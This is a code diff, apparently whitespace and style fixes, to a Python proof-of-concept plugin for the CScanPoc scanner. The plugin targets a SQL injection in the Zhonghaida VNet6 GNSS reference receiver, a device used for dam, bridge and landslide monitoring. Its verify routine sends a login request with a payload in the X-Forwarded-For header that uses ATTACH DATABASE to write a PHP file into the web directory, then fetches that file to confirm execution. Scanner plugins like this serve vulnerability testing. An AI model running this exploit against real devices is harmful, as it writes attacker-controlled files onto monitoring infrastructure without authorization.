@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Zhonghaida_0007' # 平台漏洞编号，留空
+    vuln_id = 'Zhonghaida_0007'  # 平台漏洞编号，留空
     name = '中海达设备 SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2015-09-13'  # 漏洞公布时间
     desc = '''
         该产品是用于：滑坡监测，尾矿库安全监测，水库大坝安全监测，桥梁健康监测，沉降塌陷监测，建筑监测，机械精密控制，精准农业导航，和精密定位的GNSS接收机。
@@ -19,6 +20,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = '中海达VNet6专业型参考站接收机'  # 漏洞应用名称
     product_version = '中海达VNet6专业型参考站接收机'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '31fabf1a-58d7-42c7-be9f-f6eaf03d19fa'
@@ -32,8 +34,8 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #refer     :http://wooyun.org/bugs/wooyun-2015-0140314
+
+            # refer     :http://wooyun.org/bugs/wooyun-2015-0140314
             hh = hackhttp.hackhttp()
             arg = self.target
             raw = """
@@ -50,9 +52,9 @@ X-Forwarded-For: 120.202.60.143/',1,2,3,4,5,6);ATTACH DATABASE '/home/www/apache
 
 usr=guest&psw=guest&action=1&lang=en&redirect=%2Fpages%2Fen%2Fuser.php
             """
-            code, head,res, errcode, _ = hh.http(arg + '/login.php', raw=raw)
-            code, head,res, errcode, _ = hh.http(arg + '/CSS/223.php')
-            if code ==200 and  'phpinfo()' in res:
+            code, head, res, errcode, _ = hh.http(arg + '/login.php', raw=raw)
+            code, head, res, errcode, _ = hh.http(arg + '/CSS/223.php')
+            if code == 200 and 'phpinfo()' in res:
                 #security_hole(arg + 'CSS/223.php')
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
@@ -62,6 +64,7 @@ usr=guest&psw=guest&action=1&lang=en&redirect=%2Fpages%2Fen%2Fuser.php
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
